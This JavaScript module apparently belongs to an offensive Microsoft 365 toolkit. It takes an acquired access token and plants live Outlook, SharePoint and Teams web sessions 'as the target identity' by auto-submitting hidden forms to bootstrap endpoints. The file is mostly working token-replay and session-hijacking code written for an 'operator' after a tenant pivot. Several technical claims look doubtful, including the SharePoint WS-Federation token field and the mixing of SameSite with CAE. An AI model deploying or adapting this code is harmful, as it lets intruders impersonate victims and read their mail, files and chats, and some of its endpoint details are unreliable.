/**
 * Browser-side equivalent of ROADtools' `roadtx owalogin` — opens the
 * Outlook / SharePoint / Teams Web UI as the target identity by POSTing a
 * substrate access token to the relevant `?bO=1` endpoint. The substrate
 * answers with `Set-Cookie` headers that the browser persists for that
 * origin natively, opening the UI session without a re-login round-trip.
 *
 * Legitimate use case
 * -------------------
 * After a tenant pivot (the operator switched a multi-tenant account to
 * a different active tenantId), the WebUI already holds a fresh bearer
 * for the new tenant's Outlook / Teams / SPO scope. Rather than burn a
 * device-code or pop another MSAL login, this helper lets the operator
 * "promote" that already-acquired token into live UI session cookies for
 * the corresponding Microsoft 365 service. The substrate APIs accept
 * Bearer-scope tokens and reply with the `Set-Cookie` headers that open
 * the UI session natively.
 *
 * This is the same primitive ROADrecon / AzureHound use under the hood;
 * exposed here so the operator does NOT need to copy the token out of
 * the WebUI, decode it, and POST it manually with curl.
 *
 * Token handling
 * --------------
 * The token is embedded into a transient `<form>` element that auto-
 * submits into a `target=_blank` window opened beforehand. The form is
 * removed from the parent DOM in the same microtask as `.submit()` so:
 *
 *   - It is never accessible to other scripts via `document.forms[…]`
 *     for longer than one event loop tick.
 *   - It never appears in the user's reflowed DOM (no visible artifact).
 *   - It is never written to `localStorage`, `sessionStorage`, or
 *     `IndexedDB`.
 *   - It is never `console.log`'d or stringified anywhere — including
 *     error messages, which only mention the destination URL.
 *
 * The new tab IS the consumer — the substrate response sets cookies on
 * that origin which the browser persists, so the parent tab no longer
 * needs to hold the token. The parent SHOULD clear its in-memory copy
 * after this call (e.g. set `localToken = ""`) if it doesn't need to
 * re-issue the call.
 *
 * The browser cannot set httpOnly cookies cross-origin from JavaScript;
 * we rely on the substrate's own response headers for that, which is why
 * we POST to the substrate URL rather than trying to `document.cookie =`
 * ourselves.
 *
 * Operator caveats
 * ----------------
 *   - Pop-up blocking: the new tab MUST be opened from a synchronous
 *     user gesture (click handler). Calling these helpers outside one
 *     causes `window.open` to return null in most browsers; the caller
 *     gets `null` back and should surface a "please click again" hint.
 *   - SameSite=Strict: some tenants ship CA policies that require the
 *     UI to also pass a CAE step-up. The new tab will then redirect to
 *     `login.microsoftonline.com` instead of landing on the inbox.
 *     That's a tenant-config issue, not a bug here.
 *   - Scopes: tokens minted for the wrong audience (e.g. Graph instead
 *     of `https://outlook.office.com/.default`) will be silently
 *     rejected by the substrate with a 401 inside the new tab. There is
 *     no client-side way to validate the audience without parsing the
 *     JWT, which we intentionally avoid here (the operator already
 *     decoded the token in the Account Intelligence panel before
 *     reaching this code-path).
 */
/**
 * Open a new tab and POST the bearer token into it via an auto-submitting
 * `<form>` that is removed from the parent DOM immediately after submit.
 *
 * Returns the new Window handle (or null if pop-up was blocked or we are
 * running outside a browser).
 *
 * NEVER logs or stringifies the token. Throws TypeError only when the
 * token is missing or empty — the error message does not contain any
 * token bytes.
 */
function postTokenInNewTab(bearerToken, descriptor) {
    var _a;
    if (typeof window === "undefined" || typeof document === "undefined") {
        return null;
    }
    if (!bearerToken || typeof bearerToken !== "string") {
        throw new TypeError("postTokenInNewTab: bearerToken is required");
    }
    // Open the new tab synchronously inside the user gesture. Browsers
    // block `window.open` from arbitrary script — the caller MUST invoke
    // this from a click / keydown handler.
    const newTab = window.open("", descriptor.windowName);
    if (!newTab) {
        // Popup blocked. Operator must allow popups for this origin (or
        // re-trigger via a more explicit click).
        return null;
    }
    // Build a self-submitting form whose target IS the just-opened tab.
    // We use POST so the token never lands in the URL (no Referer leak,
    // no history entry, no server access log with the bearer in it).
    const form = document.createElement("form");
    form.method = "POST";
    form.action = descriptor.url;
    form.target = descriptor.windowName;
    form.enctype = "application/x-www-form-urlencoded";
    form.style.display = "none";
    // `autocomplete=off` is belt-and-braces — the form is removed in the
    // next tick anyway, but this prevents any password-manager from
    // sniffing the field shape.
    form.autocomplete = "off";
    const tokenInput = document.createElement("input");
    tokenInput.type = "hidden";
    tokenInput.name = descriptor.tokenField;
    // Assign via `.value` rather than `setAttribute` so the token is held
    // as a JS string property, not echoed into the serialized DOM.
    tokenInput.value = bearerToken;
    form.appendChild(tokenInput);
    for (const [key, value] of Object.entries((_a = descriptor.extraFields) !== null && _a !== void 0 ? _a : {})) {
        const extra = document.createElement("input");
        extra.type = "hidden";
        extra.name = key;
        extra.value = value;
        form.appendChild(extra);
    }
    document.body.appendChild(form);
    try {
        form.submit();
    }
    finally {
        // Synchronous removal — the form's request is already in flight by
        // the time `.submit()` returns, so removing it does not abort the
        // POST. Doing it in a `setTimeout(0)` would leave a brief window
        // where `document.forms[…]` could enumerate it; the synchronous
        // remove eliminates that race.
        if (form.parentNode) {
            form.parentNode.removeChild(form);
        }
        // Belt-and-braces: blank the input value before GC so memory dumps
        // taken between submit-completion and GC don't show the bearer.
        tokenInput.value = "";
    }
    return newTab;
}
/**
 * Open Outlook on the Web (OWA) as the identity represented by the
 * supplied substrate access token. The token MUST be scoped to
 * `https://outlook.office.com/.default` (or a sub-scope like
 * `Mail.Read`). Returns the Window handle or null on pop-up block.
 */
export function openOutlookAsIdentity(substrateAccessToken, opts = {}) {
    // `?bO=1` is the OWA bootstrap flag that tells the front door to take
    // the form-POST token and mint OWA session cookies on the response.
    // Without it OWA renders a login form instead.
    const url = opts.mailbox
        ? `https://outlook.office.com/owa/?bO=1&realm=${encodeURIComponent(domainOf(opts.mailbox))}`
        : "https://outlook.office.com/owa/?bO=1";
    return postTokenInNewTab(substrateAccessToken, {
        url,
        windowName: "azbm-owa-session",
        // OWA expects the bearer in the `code` field name in the bootstrap
        // form-post flow (this mirrors the historical OAuth implicit grant
        // payload shape OWA recognizes natively).
        tokenField: "code",
        extraFields: {
            id_token: "",
            session_state: "",
            state: "",
        },
    });
}
/**
 * Open SharePoint Online as the supplied identity. Token MUST be scoped
 * to the SPO tenant URL itself (`https://contoso.sharepoint.com/.default`),
 * NOT to the generic Graph audience — SPO checks audience strictly.
 *
 * Returns the Window handle or null on pop-up block.
 */
export function openSharePointAsIdentity(substrateAccessToken, opts) {
    var _a;
    if (!opts.tenantUrl || !/^https?:\/\/[^/]+\.sharepoint\.com$/i.test(opts.tenantUrl)) {
        throw new TypeError("openSharePointAsIdentity: opts.tenantUrl must be of the form https://<tenant>.sharepoint.com");
    }
    const path = (_a = opts.sitePath) !== null && _a !== void 0 ? _a : "/_layouts/15/sharepoint.aspx";
    // SPO accepts the bootstrap via /_forms/default.aspx?ReturnUrl=…&fa=…
    // — the substrate path is `/_forms/default.aspx` with a wreply target.
    const url = `${opts.tenantUrl}/_forms/default.aspx?ReturnUrl=${encodeURIComponent(path)}`;
    return postTokenInNewTab(substrateAccessToken, {
        url,
        windowName: "azbm-spo-session",
        // SPO's federation passive endpoint reads the bearer from `wresult`
        // when `wa=wsignin1.0`. We provide both the modern (`access_token`)
        // and the WS-Federation (`wresult`) field names so whichever endpoint
        // handles the POST finds the token in its expected slot. The unused
        // field is ignored.
        tokenField: "access_token",
        extraFields: {
            wa: "wsignin1.0",
            wresult: substrateAccessToken,
        },
    });
}
/* ------------------------------------------------------------------ */
/*  Teams                                                              */
/* ------------------------------------------------------------------ */
/**
 * Open Microsoft Teams Web as the supplied identity. Token MUST be
 * scoped to `https://api.spaces.skype.com/.default` (Teams substrate).
 * Returns the Window handle or null on pop-up block.
 */
export function openTeamsAsIdentity(substrateAccessToken) {
    // Teams Web hosts its bootstrap at /go — the front door promotes a
    // POSTed bearer into the chat session cookies.
    const url = "https://teams.microsoft.com/go?bO=1";
    return postTokenInNewTab(substrateAccessToken, {
        url,
        windowName: "azbm-teams-session",
        tokenField: "access_token",
        extraFields: {
            // Teams ignores unknown fields; harmless to include.
            token_type: "Bearer",
        },
    });
}
/* ------------------------------------------------------------------ */
/*  Local helpers                                                      */
/* ------------------------------------------------------------------ */
/**
 * Return the domain portion of an email-like address. Used to derive the
 * `realm=` parameter for shared-mailbox OWA bootstrap. Never throws.
 */
function domainOf(address) {
    if (!address)
        return "";
    const at = address.lastIndexOf("@");
    if (at < 0)
        return address;
    return address.slice(at + 1);
}
//# sourceMappingURL=owalogin-cookie-plant.js.map